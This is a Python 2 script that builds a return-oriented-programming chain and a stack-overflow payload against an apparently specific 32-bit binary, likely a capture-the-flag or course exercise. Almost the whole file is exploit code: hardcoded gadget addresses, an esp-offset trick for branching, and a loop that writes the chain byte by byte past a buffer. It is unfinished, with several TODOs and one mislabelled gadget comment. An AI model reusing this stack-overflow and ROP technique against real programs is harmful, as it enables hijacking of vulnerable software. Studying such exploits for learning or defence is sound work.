#! /usr/bin/python2
from sys import stdout, stderr

pop_eax = 0x080b054a  # pop eax; ret
pop_ebx = 0x080b2643  # pop ebx; ret;
pop_ecx_clobber_eax = 0x080640c1  # pop ecx; add al, 0xf6; ret;
pop_edx_ebx = 0x0805ebf9  # pop edx; pop ebx; ret;
pop_ebp = 0x08049859  # pop ebp; ret;
plaintext = 0x80e6ce0  # Address
counter_addr = plaintext - 4
offset_addr = plaintext - 8
format_str = 0x80b40a4  # Address
xlatb = 0x0806c646  # xlatb; ret;  # mov al, BYTE PTR [ebx + al]
inc_eax = 0x08088a9e  # inc eax; ret;
dec_eax = 0x0806c0e3  # dec eax; ret;
mov_eax_peax = 0x0805fc44  # mov eax, dword ptr [eax]; ret;

eax_pe_edx = 0x08071393  # add eax, edx; ret;
mov_edx_eax = 0x08098db8  # # mov ecx, eax; mov eax, ecx; ret;
mov_ecx_eax = 0x08098db8  # mov ecx, eax; mov eax, ecx; ret;

dw_eax_edx = 0x080a36c8  # mov dword ptr [eax], edx; ret;
mov_ecx_eax = 0x08098db8  # mov ecx, eax; mov eax, ecx; ret;
fancy_dw_ebx_ecx = 0x08096c57  # mov dword ptr [ebx], ecx; add esp, 4; pop ebx; pop esi; ret;
sub_eax_ecx = 0x08069d78  # sub eax, ecx; ret;
sub_eax_edx = 0x0805f980  # sub eax, edx; ret;
neg_eax = 0x0805cdbb  # neg eax; ret;
xchg_eax_edx = 0x08074696  # xchg eax, edx; ret;
load_cl_CF = 0x08049ca4  # adc cl, cl; ret;
inc_ecx = 0x0807c165  # inc ecx; ret;
double_ecx = 0x08049d37  # add ecx, ecx; ret;

the_esp_op = 0x0809c3c1  # add esp, dword ptr [ebx + eax*4]; ret;

stdout.write("Doo Bar Baz\n")  # To be read into `plaintext`

# Note payload cannot contain ord("\n")

# Print the value of GLB using main.
dummy = [0x00000000] * 6

code = [
    # Write initial pointer location
    # *counter_addr = plaintext
    pop_ecx_clobber_eax,
    plaintext,
    pop_ebx,
    counter_addr,
    fancy_dw_ebx_ecx,
    0x0,
    plaintext,
    0x0,

    # Load Element
    # al = **counter_addr
    pop_eax,
    0x0,
    pop_ebx,
    plaintext,
    xlatb,

    # ecx = 0
    pop_eax,
    0x0,
    mov_ecx_eax,

    # We want the condition break if char <= '\n'
    # i.e. CF is set if we do sub char - '\n'
    # Load the '\n'

    # edx = char to bk + 1
    pop_eax,
    ord('D') + 1,  # TODO: should be \n + 1
    xchg_eax_edx,

    # eax = (byte) **counter_addr
    # TODO: change to using counter_addr
    # Load Element
    pop_eax,
    0x0,
    pop_ebx,
    plaintext,
    xlatb,

    # ecx = 1 if **counter_addr <= char to bk
    sub_eax_edx,
    load_cl_CF,

    # ecx *= number of instructions to skip in the set `code`
    # TODO: Tune the next set to the number of instructions left in the `code` list after the_esp_op
    double_ecx,
    double_ecx,
    inc_ecx,
    inc_ecx,
    inc_ecx,
    inc_ecx,

    # ecx *= 4
    # i.e. ecx is the offset for esp
    # Into 4 for bytes
    double_ecx,
    double_ecx,

    # ebx = offset_addr
    pop_ebx,
    offset_addr,

    # *offset_addr = ecx = offset
    # ebx = offset_addr
    fancy_dw_ebx_ecx,
    0x0,
    offset_addr,
    0x0,

    # eax = 0
    pop_eax,
    0x0,
    # esp += [ebx + 4 * eax] => esp += *offset_addr
    the_esp_op,

    # TODO: Load the **counter_addr

    # Increment
    # TODO: the actual cipher
    dec_eax,

    # Write element to ebx
    # TODO: only write one byte
    mov_ecx_eax,
    fancy_dw_ebx_ecx,
    0x0,
    plaintext,
    0x0,

    # TODO: *counter_addr++

    # TODO: Set the offset of the top of the loop, and go there
]

return_seq = [
    pop_ecx_clobber_eax,
    0xffffd030,

    pop_edx_ebx,
    0xffffd080,
    0x080e5000,  # $ebx at start of concatenate strings

    pop_ebp,
    0xffffd018,  # original ebp
    0x08049eb7,  # the return address to print plaintext
]

payload = dummy + code + return_seq

#            &i   - &buffer
len_buffer = 0x28 - 0x1c

# Write our required return address and data to the stack
byte_mask = (0b1 << 8) - 1
i = 0
for word in payload:
    assert (word >> 32) == 0  # 4 byte address
    for j in range(4):
        byte = word & byte_mask
        if byte == ord("\n"):
            stderr("Cannot write 0x0a to the stack (i.e. a newline), change value number ", i)
        if not (i == len(payload) - 1 and j == 3):
            stdout.write(chr(byte) + "B" * (len_buffer - 1) + "\x00\x00\x00")
        else:
            stdout.write(chr(byte) + "B" * (len_buffer - 1) + "\x09\x00\x00")
        word >>= 8
    i += 1

stdout.flush()
